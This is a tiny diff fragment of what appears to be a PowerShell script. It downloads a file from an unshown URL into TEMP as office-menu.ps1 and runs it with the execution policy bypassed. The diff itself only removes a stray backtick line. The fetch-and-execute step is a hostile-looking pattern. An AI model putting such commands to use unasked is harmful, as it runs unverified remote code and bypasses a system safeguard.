@@ -4,4 +4,3 @@ $f  = "$env:TEMP\office-menu.ps1"
 Invoke-WebRequest $u -OutFile $f
 
 powershell -ExecutionPolicy Bypass -File $f
-``
